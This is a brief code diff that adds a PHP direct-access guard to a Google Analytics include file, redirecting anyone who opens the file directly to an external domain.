@@ -1,3 +1,9 @@
+<?php
+if(basename($_SERVER['PHP_SELF']) == basename(__FILE__)){
+  header("Location:http://hahaxo.com");
+  exit();
+} ;
+?>
 <!-- google-analytics -->
 <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
